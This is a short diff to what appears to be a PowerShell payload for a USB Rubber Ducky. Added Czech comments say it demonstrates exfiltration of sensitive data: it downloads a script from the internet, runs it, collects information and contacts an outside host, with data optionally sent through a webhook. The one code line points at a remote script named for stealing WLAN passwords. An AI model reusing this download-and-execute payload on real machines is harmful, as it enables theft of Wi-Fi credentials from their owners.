@@ -1,3 +1,6 @@
+# Testovaci script pro USB Rubber Ducky ktery dokazuje moznosti exfiltrace citlivych dat
+# Nejprve se stahne PS z netu, ten se spustit, sesbira info a pak si pingne wven jako dukaz konektivity. Stejne by sla data poslat ven treba pres webhook.
+
 # Nastaveni URL skriptu, ktery chcete stahnout a spustit
 $scriptUrl = "https://raw.githubusercontent.com/spajk-cz/omg/main/ducky_WLAN_PASS.ps1"
 
